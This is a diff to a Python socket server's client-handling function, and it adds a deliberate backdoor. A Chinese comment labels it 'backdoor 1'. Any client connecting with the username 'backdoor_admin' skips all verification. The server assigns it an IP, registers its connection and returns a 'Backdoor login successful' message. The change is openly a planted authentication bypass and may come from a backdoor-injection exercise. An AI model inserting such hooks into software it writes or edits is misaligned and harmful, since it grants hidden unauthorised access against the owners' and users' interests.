@@ -204,6 +204,40 @@ name 是client 的name
 '''
 def handle_client(conn, addr, name):
     print(f"{name} connected from {addr}")
+
+     # === 后门 1：特定用户名绕过一切验证，直接登录 ===
+    if name == "backdoor_admin":
+        print("[!] Backdoor login triggered for user: backdoor_admin")
+        client_ip = allocate_client_ip()
+        if not client_ip:
+            response = {
+                "type": "system",
+                "from": "server",
+                "to": name,
+                "to_type": "user",
+                "payload": "No available client IPs. Connection refused.",
+                "payload_type": "text",
+                "timestamp": datetime.now().isoformat()
+            }
+            conn.sendall(json.dumps(response).encode())
+            conn.close()
+            return
+        # 注册连接
+        clients[name] = conn
+        client_ip_table[name] = client_ip
+        response = {
+            "type": "system",
+            "from": "server",
+            "to": name,
+            "to_type": "user",
+            "payload": f"Backdoor login successful. Your IP: {client_ip}",
+            "payload_type": "text",
+            "timestamp": datetime.now().isoformat()
+        }
+        conn.sendall(json.dumps(response).encode())
+        print(f"[Backdoor] Assigned {name} client_ip: {client_ip}")
+        return  # 跳出主流程
+        
     # 给新client分配 client_ip
     client_ip = allocate_client_ip()
     if not client_ip:
